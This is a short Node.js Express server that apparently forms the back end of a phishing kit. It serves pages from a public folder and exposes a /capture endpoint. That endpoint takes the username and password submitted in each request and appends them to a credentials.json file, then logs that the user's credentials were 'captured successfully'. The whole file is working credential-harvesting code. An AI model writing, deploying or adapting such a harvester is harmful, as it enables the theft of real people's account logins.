const express = require('express');
const fs = require('fs');

const app = express();

app.use(express.static('./public'));
app.use(express.json());

const port = process.env.PORT || 8080;

app.listen(port, () => { console.log(`Listening at localhost:${port}`) ;} )

app.use('/capture', ( req, res ) => { capture( req, res ); });

function capture(req, res){
    body = req.body;
    User = {
        'User': {
            'Uname': body.Username,
            'Pass': body.Password
        }
    }
    fs.appendFile('./credentials.json', JSON.stringify(User, null, 5), (err) => {
        if (err)
            console.error( 'Error while saving file. Error ' + err );
        else {
            res.sendStatus(200);
            console.log('Credentials of user : ' + body.username + ' captured successfully!');
        }
    })
}